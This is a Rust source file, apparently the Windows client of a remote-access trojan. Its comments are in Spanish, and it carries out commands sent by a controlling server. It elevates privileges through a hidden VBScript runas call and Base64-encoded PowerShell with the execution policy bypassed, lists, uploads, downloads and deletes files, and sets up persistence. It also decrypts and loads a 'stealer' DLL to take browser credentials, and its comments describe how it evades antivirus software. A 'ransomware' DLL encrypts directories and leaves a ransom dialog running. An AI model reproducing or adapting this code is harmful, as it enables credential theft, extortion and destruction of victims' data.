// The /elevate command now exclusively uses the LOLBAS technique with pcalua.exe

#[cfg(not(target_os = "windows"))]
fn elevate_agent() -> String {
    format!("__ERROR__:Elevación solo soportada en Windows{}", DELIMITER)
}

/// [DEPRECATED] Estas funciones ya no se usan pero se mantienen por compatibilidad
/// Ejecuta un comando con privilegios elevados usando múltiples técnicas sigilosas
/// Intenta varios métodos en orden de sigilo:
/// 1. COM Elevation Moniker (más sigiloso, sin PowerShell)
/// 2. ShellExecute con RunAs (nativo de Windows)
/// 3. PowerShell como fallback (menos sigiloso pero más compatible)
#[cfg(target_os = "windows")]
#[allow(dead_code)]
fn elevate_command(command: &str) -> String {
    debug_print!("DEBUG: Elevando comando: {}", command);

    // TÉCNICA 1: Intentar COM Elevation Moniker (más sigiloso)
    // Usa COM para elevar sin llamar a PowerShell directamente
    if let Ok(result) = elevate_via_com(command) {
        return result;
    }

    debug_print!("DEBUG: COM elevation failed, trying ShellExecute...");

    // TÉCNICA 2: ShellExecute con runas (nativo, menos detectable)
    if let Ok(result) = elevate_via_shellexecute(command) {
        return result;
    }

    debug_print!("DEBUG: ShellExecute failed, trying PowerShell fallback...");

    // TÉCNICA 3: PowerShell como último recurso (más detectable)
    elevate_via_powershell(command)
}

/// Elevación usando COM Elevation Moniker (más sigiloso, no usa PowerShell)
#[cfg(target_os = "windows")]
fn elevate_via_com(command: &str) -> Result<String, String> {
    use std::os::windows::process::CommandExt;
    use std::process::Command;

    // Crear un archivo batch temporal para ejecutar el comando
    let temp_dir = std::env::temp_dir();
    let batch_name = format!("~sys{}.bat", std::process::id());
    let batch_path = temp_dir.join(&batch_name);
    let output_name = format!("~out{}.txt", std::process::id());
    let output_path = temp_dir.join(&output_name);

    // Escribir comando al batch
    let batch_content = format!(
        "@echo off\n{} > \"{}\" 2>&1\nexit",
        command,
        output_path.display()
    );

    if let Err(_) = fs::write(&batch_path, batch_content) {
        return Err("Failed to create batch file".to_string());
    }

    // Usar wscript con VBScript para elevar de forma sigilosa
    // Esto evita llamar a PowerShell directamente
    let vbs_content = format!(
        r#"Set UAC = CreateObject("Shell.Application")
UAC.ShellExecute "cmd.exe", "/c ""{}""", "", "runas", 0
WScript.Sleep 3000"#,
        batch_path.display()
    );

    let vbs_name = format!("~elv{}.vbs", std::process::id());
    let vbs_path = temp_dir.join(&vbs_name);

    if let Err(_) = fs::write(&vbs_path, vbs_content) {
        let _ = fs::remove_file(&batch_path);
        return Err("Failed to create VBS file".to_string());
    }

    // Ejecutar VBScript con wscript (sin ventana)
    let _ = Command::new("wscript")
        .args(&[
            "//NoLogo",
            "//B", // Batch mode (sin UI)
            vbs_path.to_str().unwrap(),
        ])
        .creation_flags(0x08000000) // CREATE_NO_WINDOW
        .output();

    // Esperar un poco para que el comando se ejecute
    std::thread::sleep(std::time::Duration::from_secs(4));

    // Leer output
    let result = match fs::read_to_string(&output_path) {
        Ok(content) => {
            // Limpiar archivos temporales
            let _ = fs::remove_file(&batch_path);
            let _ = fs::remove_file(&vbs_path);
            let _ = fs::remove_file(&output_path);

            format!(
                "__INFO__:Comando elevado ejecutado (COM)\n{}{}",
                content, DELIMITER
            )
        }
        Err(_) => {
            // Limpiar archivos temporales
            let _ = fs::remove_file(&batch_path);
            let _ = fs::remove_file(&vbs_path);
            let _ = fs::remove_file(&output_path);

            return Err("Failed to read output".to_string());
        }
    };

    Ok(result)
}

/// Elevación usando ShellExecute nativo (sin PowerShell)
#[cfg(target_os = "windows")]
fn elevate_via_shellexecute(command: &str) -> Result<String, String> {
    use std::os::windows::process::CommandExt;
    use std::process::Command;

    // Crear batch temporal
    let temp_dir = std::env::temp_dir();
    let batch_name = format!("~cmd{}.bat", std::process::id());
    let batch_path = temp_dir.join(&batch_name);
    let output_name = format!("~res{}.txt", std::process::id());
    let output_path = temp_dir.join(&output_name);

    let batch_content = format!(
        "@echo off\n{} > \"{}\" 2>&1",
        command,
        output_path.display()
    );

    if let Err(_) = fs::write(&batch_path, batch_content) {
        return Err("Failed to create batch".to_string());
    }

    // Ejecutar con runas usando cmd
    let _ = Command::new("cmd")
        .args(&[
            "/c",
            "start",
            "/wait",
            "runas",
            "/user:Administrator",
            batch_path.to_str().unwrap(),
        ])
        .creation_flags(0x08000000)
        .output();

    // Esperar
    std::thread::sleep(std::time::Duration::from_secs(3));

    let result = match fs::read_to_string(&output_path) {
        Ok(content) => {
            let _ = fs::remove_file(&batch_path);
            let _ = fs::remove_file(&output_path);
            format!(
                "__INFO__:Comando elevado ejecutado (ShellExecute)\n{}{}",
                content, DELIMITER
            )
        }
        Err(_) => {
            let _ = fs::remove_file(&batch_path);
            let _ = fs::remove_file(&output_path);
            return Err("Failed to read output".to_string());
        }
    };

    Ok(result)
}

/// Elevación usando PowerShell (fallback, más detectable)
#[cfg(target_os = "windows")]
fn elevate_via_powershell(command: &str) -> String {
    use std::os::windows::process::CommandExt;
    use std::process::Command;

    // Ofuscar el script de PowerShell usando encoding Base64
    let ps_cmd = format!("cmd.exe /c {} > $env:TEMP\\elv_out.txt 2>&1", command);

    // Encodear en Base64 para ofuscar
    let encoded_cmd = base64_encode(ps_cmd.as_bytes());

    // Usar -EncodedCommand para ofuscar el comando
    let _ = Command::new("powershell")
        .args(&[
            "-NoProfile",
            "-NonInteractive",
            "-WindowStyle",
            "Hidden",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            &format!(
                "Start-Process powershell -ArgumentList '-EncodedCommand {}' -Verb RunAs -Wait",
                encoded_cmd
            ),
        ])
        .creation_flags(0x08000000) // CREATE_NO_WINDOW
        .output();

    // Esperar
    std::thread::sleep(std::time::Duration::from_secs(2));

    // Leer output
    let temp_dir = std::env::temp_dir();
    let output_path = temp_dir.join("elv_out.txt");

    match fs::read_to_string(&output_path) {
        Ok(content) => {
            let _ = fs::remove_file(&output_path);
            format!(
                "__INFO__:Comando elevado ejecutado (PowerShell)\n{}{}",
                content, DELIMITER
            )
        }
        Err(_) => {
            format!(
                "__ERROR__:Error al elevar comando (usuario rechazó UAC o error de ejecución){}",
                DELIMITER
            )
        }
    }
}

#[cfg(not(target_os = "windows"))]
fn elevate_command(command: &str) -> String {
    format!("__ERROR__:Elevación solo soportada en Windows{}", DELIMITER)
}

/// Minimum length for a valid Windows drive path (e.g., "C:")
const MIN_WINDOWS_DRIVE_PATH_LEN: usize = 2;

/// Get the current working directory as a string
fn get_current_dir() -> String {
    CURRENT_DIR
        .lock()
        .map(|dir| dir.to_string_lossy().to_string())
        .unwrap_or_else(|e| {
            debug_print!("DEBUG: Failed to acquire CURRENT_DIR lock: {}", e);
            #[cfg(target_os = "windows")]
            {
                "C:\\".to_string()
            }
            #[cfg(not(target_os = "windows"))]
            {
                "/".to_string()
            }
        })
}

/// Change the current working directory
fn change_directory(path: &str) -> String {
    let new_path = if path.is_empty() {
        // Empty path means go to home or default
        #[cfg(target_os = "windows")]
        {
            env::var("USERPROFILE").unwrap_or_else(|_| "C:\\".to_string())
        }
        #[cfg(not(target_os = "windows"))]
        {
            env::var("HOME").unwrap_or_else(|_| "/".to_string())
        }
    } else if path == ".." {
        // Go up one directory
        let current = get_current_dir();
        Path::new(&current)
            .parent()
            .map(|p| p.to_string_lossy().to_string())
            .unwrap_or(current)
    } else if path.starts_with('/')
        || (path.len() >= MIN_WINDOWS_DRIVE_PATH_LEN && path.chars().nth(1) == Some(':'))
    {
        // Absolute path (Unix style or Windows drive letter like C:)
        path.to_string()
    } else {
        // Relative path
        let current = get_current_dir();
        let current_path = Path::new(&current);
        current_path.join(path).to_string_lossy().to_string()
    };

    // Verify the path exists and is a directory
    let path_obj = Path::new(&new_path);
    if path_obj.exists() && path_obj.is_dir() {
        match CURRENT_DIR.lock() {
            Ok(mut dir) => {
                *dir = PathBuf::from(&new_path);
                debug_print!("DEBUG: Directorio cambiado a: {}", new_path);
                format!("__CWD__:{}{}", new_path, DELIMITER)
            }
            Err(e) => {
                format!(
                    "__ERROR__:Error interno al cambiar directorio: {}{}",
                    e, DELIMITER
                )
            }
        }
    } else if !path_obj.exists() {
        format!(
            "__ERROR__:El directorio no existe: {}{}",
            new_path, DELIMITER
        )
    } else {
        format!(
            "__ERROR__:La ruta no es un directorio: {}{}",
            new_path, DELIMITER
        )
    }
}

/// Get current working directory response
fn get_pwd() -> String {
    let current = get_current_dir();
    format!("__CWD__:{}{}", current, DELIMITER)
}

fn list_directory(dir_path: &str) -> String {
    // Use the provided path, or current directory if empty
    let actual_path = if dir_path.is_empty() {
        get_current_dir()
    } else {
        dir_path.to_string()
    };

    debug_print!("DEBUG: Listando directorio: {}", actual_path);

    match fs::read_dir(&actual_path) {
        Ok(entries) => {
            // Format: __DIRLIST__:path:entries
            // This includes the path so the client knows which directory was listed
            let mut result = format!("__DIRLIST__:{}:", actual_path);
            let mut items = Vec::new();

            for entry in entries {
                if let Ok(entry) = entry {
                    let path = entry.path();
                    let name = entry.file_name().to_string_lossy().to_string();

                    let is_dir = path.is_dir();
                    let size = if is_dir {
                        0
                    } else {
                        fs::metadata(&path).map(|m| m.len()).unwrap_or(0)
                    };

                    // Formato: type|name|size
                    // type: D=directory, F=file
                    let type_char = if is_dir { "D" } else { "F" };
                    items.push(format!("{}|{}|{}", type_char, name, size));
                }
            }

            result.push_str(&items.join("\n"));
            result.push_str(DELIMITER);
            debug_print!("DEBUG: Listado completado, {} items", items.len());
            result
        }
        Err(e) => {
            debug_print!("DEBUG: Error listando directorio: {}", e);
            format!(
                "__ERROR__:No se pudo listar el directorio '{}': {}{}",
                actual_path, e, DELIMITER
            )
        }
    }
}

fn download_file(file_path: &str) -> String {
    debug_print!("DEBUG: Intentando leer archivo: {}", file_path);

    match fs::read(file_path) {
        Ok(file_data) => {
            let encoded = base64_encode(&file_data);
            let file_name = Path::new(file_path)
                .file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("unknown");

            debug_print!("DEBUG: Archivo leído, {} bytes", file_data.len());
            format!(
                "__FILE__:{}:{}:{}{}",
                file_name,
                file_data.len(),
                encoded,
                DELIMITER
            )
        }
        Err(e) => {
            debug_print!("DEBUG: Error leyendo archivo: {}", e);
            format!("__ERROR__:No se pudo leer el archivo: {}{}", e, DELIMITER)
        }
    }
}

fn upload_file(command: &str) -> String {
    // Formato: __UPLOAD__|ruta_destino|datos_base64
    let parts: Vec<&str> = command.splitn(3, '|').collect();

    if parts.len() != 3 {
        return format!("__ERROR__:Formato de upload inválido{}", DELIMITER);
    }

    let dest_path = parts[1];
    let encoded_data = parts[2].trim(); // TRIM para eliminar \n y espacios

    debug_print!(
        "DEBUG: Decodificando {} bytes de base64",
        encoded_data.len()
    );
    debug_print!("DEBUG: Ruta destino: {}", dest_path);

    match base64_decode(encoded_data) {
        Ok(file_data) => {
            debug_print!(
                "DEBUG: Escribiendo {} bytes a {}",
                file_data.len(),
                dest_path
            );
            match fs::write(dest_path, file_data) {
                Ok(_) => {
                    debug_print!("DEBUG: Archivo guardado exitosamente");
                    format!("__SUCCESS__:Archivo guardado en {}{}", dest_path, DELIMITER)
                }
                Err(e) => {
                    debug_print!("DEBUG: Error guardando archivo: {}", e);
                    format!("__ERROR__:Error guardando archivo: {}{}", e, DELIMITER)
                }
            }
        }
        Err(e) => {
            debug_print!("DEBUG: Error decodificando base64: {}", e);
            format!("__ERROR__:Error decodificando datos: {}{}", e, DELIMITER)
        }
    }
}

/// Deletes a file or directory at the given path
/// Uses native Rust fs operations which map to OS-level calls
/// Tries remove_dir_all first for directories, falls back to remove_file
fn delete_path(path: &str) -> String {
    let target = Path::new(path);

    // Try as directory first, then as file
    // This avoids TOCTOU race between exists()/is_dir() and the actual deletion
    match fs::remove_dir_all(target) {
        Ok(_) => {
            debug_print!("DEBUG: Deleted (dir): {}", path);
            format!("__DELETED__:{}{}", path, DELIMITER)
        }
        Err(_) => {
            // Not a directory or failed - try as file
            match fs::remove_file(target) {
                Ok(_) => {
                    debug_print!("DEBUG: Deleted (file): {}", path);
                    format!("__DELETED__:{}{}", path, DELIMITER)
                }
                Err(e) => {
                    debug_print!("DEBUG: Error deleting: {}", e);
                    format!("__ERROR__:Failed to delete {}: {}{}", path, e, DELIMITER)
                }
            }
        }
    }
}

// Implementación simple de base64 encode/decode sin dependencias
fn base64_encode(data: &[u8]) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = String::new();

    for chunk in data.chunks(3) {
        let mut buf = [0u8; 3];
        for (i, &byte) in chunk.iter().enumerate() {
            buf[i] = byte;
        }

        let b1 = (buf[0] >> 2) & 0x3F;
        let b2 = ((buf[0] & 0x03) << 4) | ((buf[1] >> 4) & 0x0F);
        let b3 = ((buf[1] & 0x0F) << 2) | ((buf[2] >> 6) & 0x03);
        let b4 = buf[2] & 0x3F;

        result.push(CHARS[b1 as usize] as char);
        result.push(CHARS[b2 as usize] as char);
        result.push(if chunk.len() > 1 {
            CHARS[b3 as usize] as char
        } else {
            '='
        });
        result.push(if chunk.len() > 2 {
            CHARS[b4 as usize] as char
        } else {
            '='
        });
    }

    result
}

fn base64_decode(data: &str) -> Result<Vec<u8>, String> {
    let data = data.trim();
    let mut result = Vec::new();

    let decode_char = |c: char| -> Result<u8, String> {
        match c {
            'A'..='Z' => Ok(c as u8 - b'A'),
            'a'..='z' => Ok(c as u8 - b'a' + 26),
            '0'..='9' => Ok(c as u8 - b'0' + 52),
            '+' => Ok(62),
            '/' => Ok(63),
            '=' => Ok(0),
            _ => Err(format!("Carácter inválido en base64: {}", c)),
        }
    };

    let chars: Vec<char> = data.chars().collect();
    for chunk in chars.chunks(4) {
        if chunk.len() != 4 {
            continue;
        }

        let b1 = decode_char(chunk[0])?;
        let b2 = decode_char(chunk[1])?;
        let b3 = decode_char(chunk[2])?;
        let b4 = decode_char(chunk[3])?;

        result.push((b1 << 2) | (b2 >> 4));
        if chunk[2] != '=' {
            result.push((b2 << 4) | (b3 >> 2));
        }
        if chunk[3] != '=' {
            result.push((b3 << 6) | b4);
        }
    }

    Ok(result)
}

/// Roba credenciales de browsers usando DLL encriptada
/// El servidor ya subió stealer.enc y stealer.key con /upload
/// Ahora solo cargamos, desencriptamos y ejecutamos
fn harvest_credentials() -> String {
    debug_print!("DEBUG: Harvesting credentials...");

    #[cfg(not(target_os = "windows"))]
    {
        return format!("__ERROR__:Harvest solo soportado en Windows{}", DELIMITER);
    }

    #[cfg(target_os = "windows")]
    {
        // Verificar que existan los archivos subidos
        if !Path::new("stealer.enc").exists() {
            return format!(
                "__ERROR__:stealer.enc no encontrado. El servidor debe subirlo primero.{}",
                DELIMITER
            );
        }

        if !Path::new("stealer.key").exists() {
            return format!(
                "__ERROR__:stealer.key no encontrado. El servidor debe subirlo primero.{}",
                DELIMITER
            );
        }

        // Leer archivos
        let encrypted_dll = match fs::read("stealer.enc") {
            Ok(data) => data,
            Err(e) => return format!("__ERROR__:Error leyendo stealer.enc: {}{}", e, DELIMITER),
        };

        let xor_key = match fs::read("stealer.key") {
            Ok(data) => data,
            Err(e) => return format!("__ERROR__:Error leyendo stealer.key: {}{}", e, DELIMITER),
        };

        debug_print!("DEBUG: DLL encriptada: {} bytes", encrypted_dll.len());
        debug_print!("DEBUG: Clave XOR: {} bytes", xor_key.len());

        // Desencriptar DLL
        let dll_bytes = xor_decrypt(&encrypted_dll, &xor_key);
        debug_print!("DEBUG: DLL desencriptada: {} bytes", dll_bytes.len());

        // === EVASION STRATEGY ===
        // No aggressive patching (removed AMSI/ETW bypass to avoid AV signatures)
        // Evasion is achieved through:
        // 1. String obfuscation (obfstr) - all sensitive strings encrypted
        // 2. Anti-sandbox checks - comprehensive VM/debugger detection (production mode)
        // 3. Encrypted DLL loading - module is XOR encrypted
        // 4. Legitimate Windows APIs - no suspicious memory operations
        debug_print!("DEBUG: [EVASION] Using passive evasion techniques");

        // SIMPLIFICADO: LoadLibrary directo (más confiable)
        use std::ffi::CString;
        use std::os::raw::c_char;
        use winapi::um::libloaderapi::{FreeLibrary, GetProcAddress, LoadLibraryA};

        // Crear archivo temporal con nombre random
        let temp_dir = std::env::temp_dir();
        let random_name = format!("~tmp{}.tmp", std::process::id());
        let dll_path = temp_dir.join(random_name);

        debug_print!(
            "DEBUG: [EVASION] Writing DLL to temp: {}",
            dll_path.display()
        );
        if let Err(e) = std::fs::write(&dll_path, &dll_bytes) {
            return format!("__ERROR__:Failed to write DLL: {}{}", e, DELIMITER);
        }

        let result = unsafe {
            // LoadLibrary
            let path_cstring = CString::new(dll_path.to_str().unwrap()).unwrap();
            let h_module = LoadLibraryA(path_cstring.as_ptr());

            if h_module.is_null() {
                let _ = std::fs::remove_file(&dll_path);
                return format!("__ERROR__:LoadLibrary failed{}", DELIMITER);
            }

            debug_print!("DEBUG: [EVASION] ✅ DLL loaded at: {:p}", h_module);

            // GetProcAddress
            let fn_name = CString::new("steal_credentials").unwrap();
            let fn_ptr = GetProcAddress(h_module, fn_name.as_ptr());

            if fn_ptr.is_null() {
                FreeLibrary(h_module);
                let _ = std::fs::remove_file(&dll_path);
                return format!("__ERROR__:steal_credentials not found{}", DELIMITER);
            }

            debug_print!("DEBUG: [EVASION] ✅ Function found, executing...");

            // Ejecutar función CON PROTECCIÓN CONTRA CRASHES
            debug_print!("DEBUG: [EVASION] Calling steal_credentials()...");
            let exec_fn: extern "C" fn() -> *mut c_char = std::mem::transmute(fn_ptr);
            let result_ptr = exec_fn();
            debug_print!(
                "DEBUG: [EVASION] steal_credentials() returned: {:p}",
                result_ptr
            );

            if result_ptr.is_null() {
                FreeLibrary(h_module);
                let _ = std::fs::remove_file(&dll_path);
                return format!("__ERROR__:steal_credentials returned NULL{}", DELIMITER);
            }

            // Leer resultado
            let result_str = CStr::from_ptr(result_ptr).to_string_lossy().to_string();

            // Liberar memoria - buscar función free_credentials_string
            let free_fn_name = CString::new("free_credentials_string").unwrap();
            let free_ptr = GetProcAddress(h_module, free_fn_name.as_ptr());
            if !free_ptr.is_null() {
                let free_fn: extern "C" fn(*mut c_char) = std::mem::transmute(free_ptr);
                free_fn(result_ptr);
            }

            // Limpiar
            FreeLibrary(h_module);
            let _ = std::fs::remove_file(&dll_path);

            result_str
        };

        // Eliminar archivos del módulo
        fs::remove_file("stealer.enc").ok();
        fs::remove_file("stealer.key").ok();

        debug_print!("DEBUG: Resultado obtenido: {} bytes", result.len());

        // Verificar si hubo error
        if result.starts_with("ERROR:") {
            return format!("__ERROR__:{}{}", result, DELIMITER);
        }

        // Codificar en Base64 y enviar
        let encoded = base64_encode(result.as_bytes());
        format!("__CREDENTIALS_B64__:{}{}", encoded, DELIMITER)
    }
}

/// Desencripta datos con XOR
fn xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, &byte)| byte ^ key[i % key.len()])
        .collect()
}

/// Maneja el comando de persistencia
fn handle_persistence(method_str: &str) -> String {
    let method = match persistence::PersistenceMethod::from_str(method_str) {
        Some(m) => m,
        None => {
            return format!(
                "__ERROR__:Método de persistencia inválido. Usar: registry|task|wmi|startup{}",
                DELIMITER
            );
        }
    };

    match persistence::establish_persistence(method) {
        Ok(msg) => {
            debug_print!("DEBUG: [PERSISTENCE] ✅ {}", msg);
            format!("__SUCCESS__:{}{}", msg, DELIMITER)
        }
        Err(e) => {
            debug_print!("DEBUG: [PERSISTENCE] ❌ Error: {}", e);
            format!(
                "__ERROR__:Error estableciendo persistencia: {}{}",
                e, DELIMITER
            )
        }
    }
}

/// Maneja el comando de remoción de persistencia
fn handle_persistence_remove() -> String {
    match persistence::remove_persistence() {
        Ok(msg) => {
            debug_print!("DEBUG: [PERSISTENCE] ✅ Limpieza: {}", msg);
            format!("__SUCCESS__:Persistencia removida: {}{}", msg, DELIMITER)
        }
        Err(e) => {
            debug_print!("DEBUG: [PERSISTENCE] ❌ Error limpieza: {}", e);
            format!(
                "__ERROR__:Error removiendo persistencia: {}{}",
                e, DELIMITER
            )
        }
    }
}

/// Encripta archivos usando la DLL de ransomware
/// Parámetros: ruta:max_depth
fn encrypt_files(params: &str) -> String {
    debug_print!("DEBUG: Encrypting files with params: {}", params);

    #[cfg(not(target_os = "windows"))]
    {
        return format!(
            "__ERROR__:Ransomware solo soportado en Windows{}",
            DELIMITER
        );
    }

    #[cfg(target_os = "windows")]
    {
        let parts: Vec<&str> = params.split('|').collect();
        if parts.len() < 2 {
            return format!(
                "__ERROR__:Parámetros inválidos. Uso: __ENCRYPT__:ruta|max_depth{}",
                DELIMITER
            );
        }

        let path = parts[0].trim();
        let max_depth: u32 = parts[1].trim().parse().unwrap_or(5);

        debug_print!(
            "DEBUG: encrypt_files - path='{}', max_depth={}",
            path,
            max_depth
        );

        // Verificar que existan los archivos subidos
        if !Path::new("ransomware.enc").exists() {
            return format!(
                "__ERROR__:ransomware.enc no encontrado. El servidor debe subirlo primero.{}",
                DELIMITER
            );
        }

        if !Path::new("ransomware.key").exists() {
            return format!(
                "__ERROR__:ransomware.key no encontrado. El servidor debe subirlo primero.{}",
                DELIMITER
            );
        }

        // Leer archivos
        let encrypted_dll = match fs::read("ransomware.enc") {
            Ok(data) => data,
            Err(e) => return format!("__ERROR__:Error leyendo ransomware.enc: {}{}", e, DELIMITER),
        };

        let xor_key = match fs::read("ransomware.key") {
            Ok(data) => data,
            Err(e) => return format!("__ERROR__:Error leyendo ransomware.key: {}{}", e, DELIMITER),
        };

        debug_print!("DEBUG: DLL encriptada: {} bytes", encrypted_dll.len());
        debug_print!("DEBUG: Clave XOR: {} bytes", xor_key.len());

        // Desencriptar DLL
        let dll_bytes = xor_decrypt(&encrypted_dll, &xor_key);
        debug_print!("DEBUG: DLL desencriptada: {} bytes", dll_bytes.len());

        // Evasion: passive techniques only (no aggressive patching)
        debug_print!("DEBUG: [EVASION] Using passive evasion techniques");

        // Cargar DLL
        use std::ffi::CString;
        use std::os::raw::c_char;
        use winapi::um::libloaderapi::{FreeLibrary, GetProcAddress, LoadLibraryA};

        let temp_dir = std::env::temp_dir();
        let random_name = format!("~tmp{}.tmp", std::process::id());
        let dll_path = temp_dir.join(random_name);

        debug_print!(
            "DEBUG: [EVASION] Writing DLL to temp: {}",
            dll_path.display()
        );
        if let Err(e) = std::fs::write(&dll_path, &dll_bytes) {
            return format!("__ERROR__:Failed to write DLL: {}{}", e, DELIMITER);
        }

        let result = unsafe {
            let path_cstring = CString::new(dll_path.to_str().unwrap()).unwrap();
            let h_module = LoadLibraryA(path_cstring.as_ptr());

            if h_module.is_null() {
                let _ = std::fs::remove_file(&dll_path);
                return format!("__ERROR__:LoadLibrary failed{}", DELIMITER);
            }

            debug_print!("DEBUG: [EVASION] ✅ DLL loaded at: {:p}", h_module);

            let fn_name = CString::new("encrypt_directory").unwrap();
            let fn_ptr = GetProcAddress(h_module, fn_name.as_ptr());

            if fn_ptr.is_null() {
                FreeLibrary(h_module);
                let _ = std::fs::remove_file(&dll_path);
                return format!("__ERROR__:encrypt_directory not found{}", DELIMITER);
            }

            debug_print!("DEBUG: [EVASION] ✅ Function found, executing...");

            // Ejecutar función
            let path_c = CString::new(path).unwrap();
            let exec_fn: extern "C" fn(*const c_char, u32) -> *mut c_char =
                std::mem::transmute(fn_ptr);
            let result_ptr = exec_fn(path_c.as_ptr(), max_depth);

            if result_ptr.is_null() {
                FreeLibrary(h_module);
                let _ = std::fs::remove_file(&dll_path);
                return format!("__ERROR__:encrypt_directory returned NULL{}", DELIMITER);
            }

            let result_str = CStr::from_ptr(result_ptr).to_string_lossy().to_string();

            // Liberar memoria
            let free_fn_name = CString::new("free_string").unwrap();
            let free_ptr = GetProcAddress(h_module, free_fn_name.as_ptr());
            if !free_ptr.is_null() {
                let free_fn: extern "C" fn(*mut c_char) = std::mem::transmute(free_ptr);
                free_fn(result_ptr);
            }

            // ⚠️  NO descargar la DLL ni eliminar el archivo
            // El diálogo de ransomware se ejecuta en un thread separado
            // y necesita que la DLL permanezca cargada en memoria
            // La DLL y el archivo temporal permanecerán hasta que el proceso termine
            // o hasta que el usuario ingrese la key correcta

            // FreeLibrary(h_module);  // ❌ COMENTADO: No descargar DLL
            // let _ = std::fs::remove_file(&dll_path);  // ❌ COMENTADO: No eliminar archivo

            debug_print!("DEBUG: DLL permanece cargada para el diálogo persistente");

            result_str
        };

        // Eliminar archivos del módulo
        fs::remove_file("ransomware.enc").ok();
        fs::remove_file("ransomware.key").ok();

        debug_print!("DEBUG: Resultado obtenido: {}", result);

        // Verificar si hubo error
        if result.starts_with("ERROR:") {
            return format!("__ERROR__:{}{}", result, DELIMITER);
        }

        format!("__RANSOMWARE__:{}{}", result, DELIMITER)
    }
}

/// Desencripta archivos usando la DLL de ransomware
/// Parámetros: ruta:key:max_depth
fn decrypt_files(params: &str) -> String {
    debug_print!("DEBUG: Decrypting files with params: {}", params);

    #[cfg(not(target_os = "windows"))]
    {
        return format!(
            "__ERROR__:Ransomware solo soportado en Windows{}",
            DELIMITER
        );
    }

    #[cfg(target_os = "windows")]
    {
        let parts: Vec<&str> = params.split('|').collect();
        if parts.len() < 3 {
            return format!(
                "__ERROR__:Parámetros inválidos. Uso: __DECRYPT__:ruta|key|max_depth{}",
                DELIMITER
            );
        }

        // Limpiar caracteres de escape que pueden venir del terminal
        let path = parts[0].trim();
        let key_hex = parts[1]
            .trim()
            .replace("\x1b[200~", "")
            .replace("\x1b[201~", "")
            .replace("←[200~", "")
            .replace("←[201~", "");
        let max_depth: u32 = parts[2].trim().parse().unwrap_or(5);

        debug_print!(
            "DEBUG: decrypt_files - path='{}', key_hex='{}', max_depth={}",
            path,
            key_hex,
            max_depth
        );

        // Verificar que existan los archivos subidos
        if !Path::new("ransomware.enc").exists() {
            return format!(
                "__ERROR__:ransomware.enc no encontrado. El servidor debe subirlo primero.{}",
                DELIMITER
            );
        }

        if !Path::new("ransomware.key").exists() {
            return format!(
                "__ERROR__:ransomware.key no encontrado. El servidor debe subirlo primero.{}",
                DELIMITER
            );
        }

        // Leer archivos
        let encrypted_dll = match fs::read("ransomware.enc") {
            Ok(data) => data,
            Err(e) => return format!("__ERROR__:Error leyendo ransomware.enc: {}{}", e, DELIMITER),
        };

        let xor_key = match fs::read("ransomware.key") {
            Ok(data) => data,
            Err(e) => return format!("__ERROR__:Error leyendo ransomware.key: {}{}", e, DELIMITER),
        };

        debug_print!("DEBUG: DLL encriptada: {} bytes", encrypted_dll.len());

        // Desencriptar DLL
        let dll_bytes = xor_decrypt(&encrypted_dll, &xor_key);
        debug_print!("DEBUG: DLL desencriptada: {} bytes", dll_bytes.len());

        // Evasion: passive techniques only
        // No aggressive patching to avoid AV detection

        // Cargar DLL
        use std::ffi::CString;
        use std::os::raw::c_char;
        use winapi::um::libloaderapi::{FreeLibrary, GetProcAddress, LoadLibraryA};

        let temp_dir = std::env::temp_dir();
        let random_name = format!("~tmp{}.tmp", std::process::id());
        let dll_path = temp_dir.join(random_name);

        if let Err(e) = std::fs::write(&dll_path, &dll_bytes) {
            return format!("__ERROR__:Failed to write DLL: {}{}", e, DELIMITER);
        }

        let result = unsafe {
            let path_cstring = CString::new(dll_path.to_str().unwrap()).unwrap();
            let h_module = LoadLibraryA(path_cstring.as_ptr());

            if h_module.is_null() {
                let _ = std::fs::remove_file(&dll_path);
                return format!("__ERROR__:LoadLibrary failed{}", DELIMITER);
            }

            let fn_name = CString::new("decrypt_directory").unwrap();
            let fn_ptr = GetProcAddress(h_module, fn_name.as_ptr());

            if fn_ptr.is_null() {
                FreeLibrary(h_module);
                let _ = std::fs::remove_file(&dll_path);
                return format!("__ERROR__:decrypt_directory not found{}", DELIMITER);
            }

            // Ejecutar función
            let path_c = CString::new(path).unwrap();
            let key_c = CString::new(key_hex).unwrap();
            let exec_fn: extern "C" fn(*const c_char, *const c_char, u32) -> *mut c_char =
                std::mem::transmute(fn_ptr);
            let result_ptr = exec_fn(path_c.as_ptr(), key_c.as_ptr(), max_depth);

            if result_ptr.is_null() {
                FreeLibrary(h_module);
                let _ = std::fs::remove_file(&dll_path);
                return format!("__ERROR__:decrypt_directory returned NULL{}", DELIMITER);
            }

            let result_str = CStr::from_ptr(result_ptr).to_string_lossy().to_string();

            // Liberar memoria
            let free_fn_name = CString::new("free_string").unwrap();
            let free_ptr = GetProcAddress(h_module, free_fn_name.as_ptr());
            if !free_ptr.is_null() {
                let free_fn: extern "C" fn(*mut c_char) = std::mem::transmute(free_ptr);
                free_fn(result_ptr);
            }

            FreeLibrary(h_module);
            let _ = std::fs::remove_file(&dll_path);

            result_str
        };

        // Eliminar archivos del módulo
        fs::remove_file("ransomware.enc").ok();
        fs::remove_file("ransomware.key").ok();

        debug_print!("DEBUG: Resultado obtenido: {}", result);

        // Verificar si hubo error
        if result.starts_with("ERROR:") {
            return format!("__ERROR__:{}{}", result, DELIMITER);
        }

        format!("__RANSOMWARE__:{}{}", result, DELIMITER)
    }
}
